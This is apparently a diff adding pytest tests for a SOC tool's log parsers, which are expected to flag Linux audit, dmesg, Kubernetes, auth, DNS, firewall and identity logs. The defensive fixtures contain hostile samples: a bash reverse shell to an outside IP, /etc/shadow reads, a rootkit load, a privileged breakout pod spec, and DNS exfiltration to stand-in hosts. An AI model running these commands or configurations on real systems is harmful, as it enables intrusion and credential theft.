@@ -262,3 +262,167 @@ async def test_containment_anti_forensic_rejection():
         justification="netsh advfirewall set allprofiles state off"
     )
     assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_fw
+
+
+@pytest.mark.asyncio
+async def test_linux_audit_and_dmesg_parsers():
+    from src.registry.tools.soc_tools import _parse_linux_audit_records, _parse_linux_dmesg_records
+
+    audit_logs = (
+        'type=SYSCALL msg=audit(1789461535.123:455): arch=c000003e syscall=257 success=yes exit=3 a0=5 a1=... auid=1001 uid=0 comm="cat" exe="/usr/bin/cat" key="shadow_access"\n'
+        'type=PATH msg=audit(1789461535.123:455): item=0 name="/etc/shadow" nametype=NORMAL\n'
+        'type=SYSCALL msg=audit(1789461735.123:456): arch=c000003e syscall=313 success=yes exit=0 auid=1001 uid=0 comm="insmod" exe="/usr/bin/kmod" key="kernel_module_load"\n'
+        'type=EXECVE msg=audit(1789461935.123:457): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"\n'
+    )
+    total_a, findings_a, ips_a, users_a = _parse_linux_audit_records(audit_logs, "linux_audit.log")
+    assert total_a == 4
+    assert "198.51.100.77" in ips_a
+    assert "UID:1001" in users_a
+    findings_a_text = "\n".join(findings_a)
+    assert "Loadable Kernel Module (LKM) Injection" in findings_a_text
+    assert "Credential Dumping / Shadow File Access" in findings_a_text
+    assert "Command & Scripting Execution" in findings_a_text
+
+    dmesg_logs = (
+        "[   45.123456] diamorphine: loading out-of-tree module taints kernel.\n"
+        "[   45.123510] [diamorphine] loaded successfully: hooked sys_call_table at 0xffffffff82000280\n"
+        "[   85.123456] process 24891 (nsenter) entering host pid namespace\n"
+        "[  120.123456] TCP: Possible SYN flooding on port 443.\n"
+    )
+    total_d, findings_d = _parse_linux_dmesg_records(dmesg_logs, "linux_dmesg_syslog.log")
+    assert total_d == 4
+    findings_d_text = "\n".join(findings_d)
+    assert "LKM Rootkit & Kernel Taint" in findings_d_text
+    assert "Container Breakout / Host Namespace Escape" in findings_d_text
+    assert "BENIGN KERNEL WARNING" in findings_d_text
+
+
+@pytest.mark.asyncio
+async def test_k8s_audit_and_linux_auth_parsers():
+    from src.registry.tools.soc_tools import _parse_k8s_audit_records, _parse_linux_auth_records
+
+    k8s_logs = (
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system","name":"system-health-diagnostics-pod"},"requestObject":{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"breakout","image":"alpine:3.18","command":["nsenter"]}],"volumes":[{"name":"host-root","hostPath":{"path":"/"}}]}}}\n'
+        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"clusterrolebindings","name":"system-cluster-admin-binding"},"requestObject":{"roleRef":{"name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"webapp-sa"}]}}\n'
+    )
+    total_k, findings_k, ips_k, users_k = _parse_k8s_audit_records(k8s_logs, "k8s_api_audit.json")
+    assert total_k == 2
+    assert "10.244.1.45" in ips_k
+    assert "system:serviceaccount:frontend-apps:webapp-sa" in users_k
+    findings_k_text = "\n".join(findings_k)
+    assert "Container Escape via Privileged Pod" in findings_k_text
+    assert "Control Plane Takeover / RBAC Escalation" in findings_k_text
+
+    auth_logs = (
+        "Sep 14 08:34:22 host sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n"
+        "Sep 14 08:38:10 host crontab[16201]: (www-data) REPLACE (www-data)\n"
+        "Sep 14 08:41:50 host sudo: deploy : TTY=pts/3 ; USER=root ; COMMAND=/bin/bash\n"
+        "Sep 14 08:14:02 host sudo: sysadmin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\n"
+    )
+    total_auth, findings_auth, ips_auth, users_auth = _parse_linux_auth_records(auth_logs, "linux_auth.log")
+    assert total_auth == 4
+    assert "www-data" in users_auth
+    assert "deploy" in users_auth
+    findings_auth_text = "\n".join(findings_auth)
+    assert "Sudo Abuse / Unauthorized Privilege Escalation" in findings_auth_text
+    assert "Crontab Persistence Injection" in findings_auth_text
+    assert "Local Account Pivot & Root Shell" in findings_auth_text
+    assert "BENIGN BASELINE ADMIN MAINTENANCE" in findings_auth_text
+
+
+@pytest.mark.asyncio
+async def test_dns_log_parser_tunnel_dga_and_hex_exfil():
+    from src.registry.tools.soc_tools import _parse_dns_log_records
+
+    dns_logs = (
+        # DNS Tunneling TXT queries
+        "14-Sep-2026 11:05:10.012 queries: info: client @0x7f8a1 192.168.10.142#54123 (000101a4.tunnel.c2server.org): query: 000101a4.tunnel.c2server.org IN TXT + (10.0.0.2) whoami\n"
+        "14-Sep-2026 11:05:10.230 queries: info: client @0x7f8a1 192.168.10.142#54124 (000101a5.tunnel.c2server.org): query: 000101a5.tunnel.c2server.org IN TXT + (10.0.0.2) root\n"
+        "14-Sep-2026 11:05:10.450 queries: info: client @0x7f8a1 192.168.10.142#54125 (000101a6.tunnel.c2server.org): query: 000101a6.tunnel.c2server.org IN TXT + (10.0.0.2) ok\n"
+        "14-Sep-2026 11:05:10.670 queries: info: client @0x7f8a1 192.168.10.142#54126 (000101a7.tunnel.c2server.org): query: 000101a7.tunnel.c2server.org IN TXT + (10.0.0.2) sync\n"
+        # Hex-encoded Subdomain Exfiltration (admin:Password1 and 23!:root/etc/sh)
+        "14-Sep-2026 11:18:01.015 queries: info: client @0x7f8a2 192.168.10.88#54127 (61646d696e3a50617373776f726431.chunk1.exfil.badactor.net): query: 61646d696e3a50617373776f726431.chunk1.exfil.badactor.net IN A + (10.0.0.2)\n"
+        "14-Sep-2026 11:18:01.215 queries: info: client @0x7f8a2 192.168.10.88#54128 (3233213a726f6f742f6574632f7368.chunk2.exfil.badactor.net): query: 3233213a726f6f742f6574632f7368.chunk2.exfil.badactor.net IN A + (10.0.0.2)\n"
+        # DGA NXDOMAIN Queries
+        "14-Sep-2026 11:12:30.100 queries: info: client @0x7f8a3 192.168.10.205#54129 (x8q1zm9vb21akz.biz): query: x8q1zm9vb21akz.biz IN A + (10.0.0.2) NXDOMAIN\n"
+        "14-Sep-2026 11:12:30.300 queries: info: client @0x7f8a3 192.168.10.205#54130 (dj82mc7v19awzq.info): query: dj82mc7v19awzq.info IN A + (10.0.0.2) NXDOMAIN\n"
+        "14-Sep-2026 11:12:30.500 queries: info: client @0x7f8a3 192.168.10.205#54131 (zla04kqncm91x.top): query: zla04kqncm91x.top IN A + (10.0.0.2) NXDOMAIN\n"
+        # Benign CDN and Spamhaus
+        "14-Sep-2026 11:02:18.001 queries: info: client @0x7f8a4 192.168.10.60#54132 (d3g8q11abc29fg.cloudfront.net): query: d3g8q11abc29fg.cloudfront.net IN A + (10.0.0.2)\n"
+        "14-Sep-2026 11:03:00.001 queries: info: client @0x7f8a5 192.168.10.5#54133 (12.1.168.192.zen.spamhaus.org): query: 12.1.168.192.zen.spamhaus.org IN A + (10.0.0.2)\n"
+    )
+    total_dns, findings_dns, ips_dns, doms_dns = _parse_dns_log_records(dns_logs, "bind9_dns_queries.log")
+    assert total_dns == 11
+    assert "192.168.10.142" in ips_dns
+    assert "192.168.10.88" in ips_dns
+    assert "192.168.10.205" in ips_dns
+    findings_dns_text = "\n".join(findings_dns)
+    assert "DNS Tunneling C2 Channel" in findings_dns_text
+    assert "Covert DNS Data Exfiltration" in findings_dns_text
+    assert "admin:Password1" in findings_dns_text
+    assert "Algorithmic DGA Domain Generation & C2 Hunting" in findings_dns_text
+    assert "BENIGN BASELINE DNS" in findings_dns_text
+
+
+@pytest.mark.asyncio
+async def test_dynamic_flow_aggregator_beacon_and_exfil():
+    from src.registry.tools.soc_tools import _parse_firewall_traffic_records
+
+    fw_logs = (
+        # 60s periodic C2 Beaconing from 10.20.10.142 to 185.220.101.5:8443
+        "2026-09-14 11:20:00,10.20.10.142,185.220.101.5,8443,bytes_sent=520,bytes_rcvd=140,rule=Allow-Outbound\n"
+        "2026-09-14 11:21:01,10.20.10.142,185.220.101.5,8443,bytes_sent=522,bytes_rcvd=142,rule=Allow-Outbound\n"
+        "2026-09-14 11:22:00,10.20.10.142,185.220.101.5,8443,bytes_sent=518,bytes_rcvd=138,rule=Allow-Outbound\n"
+        "2026-09-14 11:23:01,10.20.10.142,185.220.101.5,8443,bytes_sent=524,bytes_rcvd=141,rule=Allow-Outbound\n"
+        # 3.84 GB Bulk Exfiltration from 10.20.10.88 to 198.51.100.240:443
+        "2026-09-14 11:38:40,10.20.10.88,198.51.100.240,443,bytes_sent=3842109400,bytes_rcvd=142050,rule=Web-Outbound\n"
+        # Authorized S3 Cloud Backup: 5.42 GB to 52.216.148.10:443 with Backup-To-Cloud
+        "2026-09-14 11:40:00,10.20.10.12,52.216.148.10,443,bytes_sent=5420000000,bytes_rcvd=200000,rule=Backup-To-Cloud,user=svc-backup\n"
+    )
+    total_fw, findings_fw, ips_fw, users_fw, doms_fw = _parse_firewall_traffic_records(fw_logs, "paloalto_traffic.log")
+    assert total_fw == 6
+    assert "10.20.10.142" in ips_fw
+    assert "10.20.10.88" in ips_fw
+    assert "185.220.101.5" in ips_fw
+    assert "198.51.100.240" in ips_fw
+    findings_fw_text = "\n".join(findings_fw)
+    assert "C2 Beaconing" in findings_fw_text
+    assert "Data Exfiltration" in findings_fw_text
+    assert "3.58 GB" in findings_fw_text or "3.84 GB" in findings_fw_text
+    assert "BENIGN BASELINE ENTERPRISE TRAFFIC" in findings_fw_text
+
+
+@pytest.mark.asyncio
+async def test_identity_and_ueba_parser():
+    from src.registry.tools.soc_tools import _parse_identity_logs
+
+    id_logs = (
+        # Cisco ASA AnyConnect VPN
+        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : user = david.clark : user IP = 185.220.101.5\n"
+        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : user = david.clark : user IP = 185.220.101.5\n"
+        "%ASA-6-113039: Group <DfltGrpPolicy> User <david.clark> IP <185.220.101.5> AnyConnect parent session started.\n"
+        "%ASA-4-722051: Group <DfltGrpPolicy> User <david.clark> IP <185.220.101.5> IPv4 Address <10.200.1.15> assigned to session\n"
+        # Entra ID Impossible Travel for john.doe (US Seattle to Frankfurt within 30 min)
+        '{"userPrincipalName":"john.doe@enterprise.com","createdDateTime":"2026-09-14T08:00:00Z","ipAddress":"198.51.100.10","location":{"city":"Seattle","countryOrRegion":"US","geoCoordinates":{"latitude":47.6062,"longitude":-122.3321}},"status":{"errorCode":0}}\n'
+        '{"userPrincipalName":"john.doe@enterprise.com","createdDateTime":"2026-09-14T08:30:00Z","ipAddress":"194.165.16.104","location":{"city":"Frankfurt","countryOrRegion":"DE","geoCoordinates":{"latitude":50.1109,"longitude":8.6821}},"status":{"errorCode":0}}\n'
+        # Pass-the-PRT / Anomalous Token for senior.engineer
+        '{"userPrincipalName":"senior.engineer@enterprise.com","createdDateTime":"2026-09-14T09:00:00Z","ipAddress":"185.196.220.14","appDisplayName":"Azure PowerShell","riskDetail":"anomalousToken","deviceDetail":{"isCompliant":false},"status":{"errorCode":0}}\n'
+        # Cellular Roaming Whitelist for alice.wang
+        '{"userPrincipalName":"alice.wang@enterprise.com","createdDateTime":"2026-09-14T09:10:00Z","ipAddress":"172.56.21.8","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
+        '{"userPrincipalName":"alice.wang@enterprise.com","createdDateTime":"2026-09-14T09:12:00Z","ipAddress":"172.56.21.44","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
+        # Typo Whitelist for charlie.brown (fails and retries 15s later)
+        '{"userPrincipalName":"charlie.brown@enterprise.com","createdDateTime":"2026-09-14T09:20:00Z","ipAddress":"198.51.100.55","status":{"errorCode":50126}}\n'
+        '{"userPrincipalName":"charlie.brown@enterprise.com","createdDateTime":"2026-09-14T09:20:15Z","ipAddress":"198.51.100.55","status":{"errorCode":0}}\n'
+    )
+    total_id, findings_id, ips_id, users_id = _parse_identity_logs(id_logs, "identity_logs.log")
+    assert "david.clark" in users_id
+    assert "john.doe@enterprise.com" in users_id
+    assert "senior.engineer@enterprise.com" in users_id
+    assert "alice.wang@enterprise.com" in users_id
+    findings_id_text = "\n".join(findings_id)
+    assert "Compromised Valid VPN Account" in findings_id_text
+    assert "Impossible Travel Anomaly" in findings_id_text
+    assert "Pass-the-PRT / Anomalous Token Replay" in findings_id_text
+    assert "BENIGN CELLULAR ROAMING" in findings_id_text
+    assert "BENIGN USER TYPO" in findings_id_text
+
